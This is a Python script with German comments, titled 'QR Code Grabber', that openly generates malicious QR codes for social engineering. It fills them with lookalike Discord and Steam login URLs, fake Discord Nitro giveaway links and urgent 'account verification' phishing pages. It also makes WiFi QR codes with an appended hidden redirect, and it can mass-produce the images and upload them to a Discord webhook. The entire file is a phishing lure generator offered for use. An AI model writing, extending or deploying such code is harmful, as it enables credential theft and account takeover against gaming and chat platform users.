import qrcode
import io
import base64
import os
import json
import requests
import time
import random
import string
from colorama import Fore, Style, init
from PIL import Image, ImageDraw, ImageFont

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

def center(text):
    try:
        import shutil
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

class QRCodeGrabber:
    def __init__(self, webhook_url=None):
        self.webhook_url = webhook_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def generate_malicious_url(self, payload_type="discord_login"):
        """Generiert verschiedene Arten von bösartigen URLs"""
        
        base_urls = {
            "discord_login": [
                "https://discord-security-verification.com/login",
                "https://discord-account-verification.net/auth",
                "https://discord-support-team.org/verify",
                "https://discord-official-security.com/login",
                "https://discord-verification-center.net/auth"
            ],
            "steam_login": [
                "https://steam-community-trade.com/login",
                "https://steam-security-check.net/auth",
                "https://steam-support-official.org/verify",
                "https://steam-account-recovery.com/login"
            ],
            "fake_giveaway": [
                "https://discord-nitro-giveaway.com/claim",
                "https://free-discord-nitro.net/get",
                "https://discord-premium-free.org/claim",
                "https://nitro-generator-real.com/generate"
            ],
            "phishing_site": [
                "https://account-verification-required.com/verify",
                "https://security-alert-action-required.net/check",
                "https://urgent-account-suspension.org/appeal"
            ]
        }
        
        if payload_type in base_urls:
            base_url = random.choice(base_urls[payload_type])
        else:
            base_url = "https://discord-security-verification.com/login"
        
        # Füge zufällige Parameter hinzu um URL einzigartig zu machen
        params = {
            'ref': ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)),
            'token': ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)),
            'redirect': base64.b64encode(self.webhook_url.encode()).decode() if self.webhook_url else 'aHR0cHM6Ly9kaXNjb3JkLmNvbQ=='
        }
        
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
    
    def create_qr_code(self, data, filename="malicious_qr.png", logo_path=None):
        """Erstellt einen QR-Code mit optionalem Logo"""
        
        try:
            # QR-Code erstellen
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_H,  # Hohe Fehlerkorrektur für Logo
                box_size=10,
                border=4,
            )
            qr.add_data(data)
            qr.make(fit=True)
            
            # QR-Code als Bild erstellen
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Logo hinzufügen wenn vorhanden
            if logo_path and os.path.exists(logo_path):
                try:
                    logo = Image.open(logo_path)
                    
                    # Logo-Größe berechnen (10% der QR-Code-Größe)
                    qr_width, qr_height = qr_img.size
                    logo_size = min(qr_width, qr_height) // 10
                    
                    # Logo skalieren
                    logo = logo.resize((logo_size, logo_size), Image.Resampling.LANCZOS)
                    
                    # Logo in der Mitte platzieren
                    logo_pos = ((qr_width - logo_size) // 2, (qr_height - logo_size) // 2)
                    qr_img.paste(logo, logo_pos)
                    
                except Exception as e:
                    pretty_print(f"Logo konnte nicht hinzugefügt werden: {str(e)}", (255,255,0))
            
            # QR-Code speichern
            qr_img.save(filename)
            pretty_print(f"QR-Code gespeichert als: {filename}", (0,255,0))
            return filename
            
        except Exception as e:
            pretty_print(f"Fehler beim Erstellen des QR-Codes: {str(e)}", (255,0,0))
            return None
    
    def create_fake_discord_qr(self):
        """Erstellt einen gefälschten Discord-Login QR-Code"""
        
        malicious_url = self.generate_malicious_url("discord_login")
        
        # Fake Discord-Daten für realistischeren QR-Code
        fake_discord_data = {
            "type": "discord_auth",
            "url": malicious_url,
            "expires": int(time.time()) + 300,  # 5 Minuten
            "nonce": ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        }
        
        qr_data = json.dumps(fake_discord_data)
        filename = f"discord_login_qr_{int(time.time())}.png"
        
        return self.create_qr_code(qr_data, filename)
    
    def create_fake_steam_qr(self):
        """Erstellt einen gefälschten Steam-Login QR-Code"""
        
        malicious_url = self.generate_malicious_url("steam_login")
        
        fake_steam_data = {
            "steamid": random.randint(76561198000000000, 76561198999999999),
            "auth_url": malicious_url,
            "timestamp": int(time.time()),
            "challenge": ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
        }
        
        qr_data = json.dumps(fake_steam_data)
        filename = f"steam_login_qr_{int(time.time())}.png"
        
        return self.create_qr_code(qr_data, filename)
    
    def create_giveaway_qr(self):
        """Erstellt einen gefälschten Giveaway QR-Code"""
        
        malicious_url = self.generate_malicious_url("fake_giveaway")
        
        giveaway_data = {
            "event": "DISCORD_NITRO_GIVEAWAY",
            "prize": "Discord Nitro (1 Jahr)",
            "claim_url": malicious_url,
            "expires": int(time.time()) + 3600,  # 1 Stunde
            "winner_id": ''.join(random.choices(string.digits, k=10))
        }
        
        qr_data = json.dumps(giveaway_data)
        filename = f"nitro_giveaway_qr_{int(time.time())}.png"
        
        return self.create_qr_code(qr_data, filename)
    
    def create_custom_qr(self, custom_url, filename=None):
        """Erstellt einen QR-Code mit benutzerdefinierter URL"""
        
        if not filename:
            filename = f"custom_qr_{int(time.time())}.png"
        
        return self.create_qr_code(custom_url, filename)
    
    def create_wifi_qr(self, ssid, password, security="WPA"):
        """Erstellt einen gefälschten WiFi QR-Code der auf bösartige Seite weiterleitet"""
        
        # Standard WiFi QR-Code Format
        wifi_data = f"WIFI:T:{security};S:{ssid};P:{password};;"
        
        # Aber wir fügen versteckte Daten hinzu
        malicious_url = self.generate_malicious_url("phishing_site")
        
        # Kombiniere WiFi-Daten mit versteckter URL
        combined_data = f"{wifi_data}\nREDIRECT:{malicious_url}"
        
        filename = f"wifi_qr_{ssid}_{int(time.time())}.png"
        return self.create_qr_code(combined_data, filename)
    
    def batch_generate_qr_codes(self, count=10, qr_type="mixed"):
        """Generiert mehrere QR-Codes auf einmal"""
        
        pretty_print(f"Generiere {count} QR-Codes vom Typ: {qr_type}", (255,128,0))
        
        generated_files = []
        
        for i in range(count):
            try:
                if qr_type == "mixed":
                    # Zufälligen Typ wählen
                    types = ["discord", "steam", "giveaway", "custom"]
                    chosen_type = random.choice(types)
                else:
                    chosen_type = qr_type
                
                if chosen_type == "discord":
                    filename = self.create_fake_discord_qr()
                elif chosen_type == "steam":
                    filename = self.create_fake_steam_qr()
                elif chosen_type == "giveaway":
                    filename = self.create_giveaway_qr()
                else:
                    custom_url = self.generate_malicious_url("phishing_site")
                    filename = self.create_custom_qr(custom_url, f"custom_qr_{i+1}_{int(time.time())}.png")
                
                if filename:
                    generated_files.append(filename)
                    pretty_print(f"[{i+1}/{count}] QR-Code erstellt: {filename}", (0,255,0))
                
                # Kurze Pause zwischen Generierungen
                time.sleep(0.1)
                
            except Exception as e:
                pretty_print(f"[{i+1}/{count}] Fehler: {str(e)}", (255,0,0))
        
        pretty_print(f"Batch-Generierung abgeschlossen! {len(generated_files)} QR-Codes erstellt.", (0,255,128))
        return generated_files
    
    def send_qr_to_webhook(self, qr_filename, description="Malicious QR Code Generated"):
        """Sendet den generierten QR-Code an Discord Webhook"""
        
        if not self.webhook_url:
            pretty_print("Kein Webhook konfiguriert!", (255,0,0))
            return False
        
        if not os.path.exists(qr_filename):
            pretty_print(f"QR-Code Datei nicht gefunden: {qr_filename}", (255,0,0))
            return False
        
        try:
            # Datei als Attachment senden
            with open(qr_filename, 'rb') as f:
                files = {'file': (qr_filename, f, 'image/png')}
                
                payload = {
                    'content': f"**QR Code Grabber - {description}**\n"
                              f"Datei: `{qr_filename}`\n"
                              f"Erstellt: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                              f"Größe: {os.path.getsize(qr_filename)} bytes"
                }
                
                response = self.session.post(self.webhook_url, data=payload, files=files)
                
                if response.status_code in [200, 204]:
                    pretty_print("QR-Code erfolgreich an Webhook gesendet!", (0,255,0))
                    return True
                else:
                    pretty_print(f"Webhook-Fehler: {response.status_code}", (255,0,0))
                    return False
                    
        except Exception as e:
            pretty_print(f"Fehler beim Senden an Webhook: {str(e)}", (255,0,0))
            return False

def run_qr_code_grabber():
    """Hauptfunktion für den QR Code Grabber"""
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    pretty_print("QR CODE GRABBER", (255,0,0))
    pretty_print("Generiert bösartige QR-Codes für Social Engineering", (255,64,64))
    pretty_print("=" * 60, (255,64,64))
    print()
    
    # Webhook URL abfragen
    webhook_url = input(rgb(255,32,32) + center("Discord Webhook URL (optional): ") + RESET)
    if webhook_url and not webhook_url.strip():
        webhook_url = None
    
    grabber = QRCodeGrabber(webhook_url)
    
    while True:
        print()
        pretty_print("QR CODE GRABBER OPTIONEN:", (255,128,0))
        print(rgb(150,255,150) + center("1. Discord Login QR-Code (Fake)") + RESET)
        print(rgb(150,255,150) + center("2. Steam Login QR-Code (Fake)") + RESET)
        print(rgb(150,255,150) + center("3. Discord Nitro Giveaway QR-Code") + RESET)
        print(rgb(150,255,150) + center("4. WiFi QR-Code (Malicious)") + RESET)
        print(rgb(150,255,150) + center("5. Benutzerdefinierter QR-Code") + RESET)
        print(rgb(255,255,150) + center("6. Batch-Generierung (Mehrere QR-Codes)") + RESET)
        print(rgb(255,100,100) + center("7. Alle QR-Code Typen generieren") + RESET)
        print(rgb(255,64,64) + center("0. Zurück zum Hauptmenü") + RESET)
        print()
        
        choice = input(rgb(255,32,32) + center("Wähle eine Option (0-7): ") + RESET).strip()
        
        if choice == "0":
            break
        elif choice == "1":
            pretty_print("Generiere gefälschten Discord Login QR-Code...", (255,255,0))
            filename = grabber.create_fake_discord_qr()
            if filename and webhook_url:
                grabber.send_qr_to_webhook(filename, "Fake Discord Login QR")
                
        elif choice == "2":
            pretty_print("Generiere gefälschten Steam Login QR-Code...", (255,255,0))
            filename = grabber.create_fake_steam_qr()
            if filename and webhook_url:
                grabber.send_qr_to_webhook(filename, "Fake Steam Login QR")
                
        elif choice == "3":
            pretty_print("Generiere Discord Nitro Giveaway QR-Code...", (255,255,0))
            filename = grabber.create_giveaway_qr()
            if filename and webhook_url:
                grabber.send_qr_to_webhook(filename, "Fake Nitro Giveaway QR")
                
        elif choice == "4":
            ssid = input(rgb(255,32,32) + "WiFi Name (SSID): " + RESET).strip()
            password = input(rgb(255,32,32) + "WiFi Passwort: " + RESET).strip()
            if ssid and password:
                pretty_print("Generiere bösartigen WiFi QR-Code...", (255,255,0))
                filename = grabber.create_wifi_qr(ssid, password)
                if filename and webhook_url:
                    grabber.send_qr_to_webhook(filename, f"Malicious WiFi QR ({ssid})")
            else:
                pretty_print("SSID und Passwort erforderlich!", (255,0,0))
                
        elif choice == "5":
            custom_url = input(rgb(255,32,32) + "Benutzerdefinierte URL: " + RESET).strip()
            if custom_url:
                pretty_print("Generiere benutzerdefinierten QR-Code...", (255,255,0))
                filename = grabber.create_custom_qr(custom_url)
                if filename and webhook_url:
                    grabber.send_qr_to_webhook(filename, "Custom Malicious QR")
            else:
                pretty_print("URL erforderlich!", (255,0,0))
                
        elif choice == "6":
            try:
                count = int(input(rgb(255,32,32) + "Anzahl QR-Codes: " + RESET).strip())
                qr_type = input(rgb(255,32,32) + "Typ (discord/steam/giveaway/mixed): " + RESET).strip().lower()
                if qr_type not in ["discord", "steam", "giveaway", "mixed"]:
                    qr_type = "mixed"
                
                files = grabber.batch_generate_qr_codes(count, qr_type)
                
                if webhook_url and files:
                    send_all = input(rgb(255,32,32) + "Alle an Webhook senden? (y/n): " + RESET).strip().lower()
                    if send_all == 'y':
                        for filename in files:
                            grabber.send_qr_to_webhook(filename, f"Batch Generated QR ({qr_type})")
                            time.sleep(1)  # Pause zwischen Uploads
                            
            except ValueError:
                pretty_print("Ungültige Anzahl!", (255,0,0))
                
        elif choice == "7":
            pretty_print("Generiere alle QR-Code Typen...", (255,255,0))
            
            # Alle Typen generieren
            types = [
                ("discord", "Fake Discord Login"),
                ("steam", "Fake Steam Login"), 
                ("giveaway", "Fake Nitro Giveaway"),
                ("wifi", "Malicious WiFi")
            ]
            
            generated = []
            for qr_type, description in types:
                try:
                    if qr_type == "discord":
                        filename = grabber.create_fake_discord_qr()
                    elif qr_type == "steam":
                        filename = grabber.create_fake_steam_qr()
                    elif qr_type == "giveaway":
                        filename = grabber.create_giveaway_qr()
                    elif qr_type == "wifi":
                        filename = grabber.create_wifi_qr("FreeWiFi", "password123")
                    
                    if filename:
                        generated.append((filename, description))
                        
                except Exception as e:
                    pretty_print(f"Fehler bei {qr_type}: {str(e)}", (255,0,0))
            
            if webhook_url and generated:
                send_all = input(rgb(255,32,32) + f"Alle {len(generated)} QR-Codes an Webhook senden? (y/n): " + RESET).strip().lower()
                if send_all == 'y':
                    for filename, description in generated:
                        grabber.send_qr_to_webhook(filename, description)
                        time.sleep(1)
        
        else:
            pretty_print("Ungültige Option!", (255,0,0))
        
        print()
        input(rgb(255,32,32) + center("Drücke Enter um fortzufahren...") + RESET)

if __name__ == "__main__":
    run_qr_code_grabber() 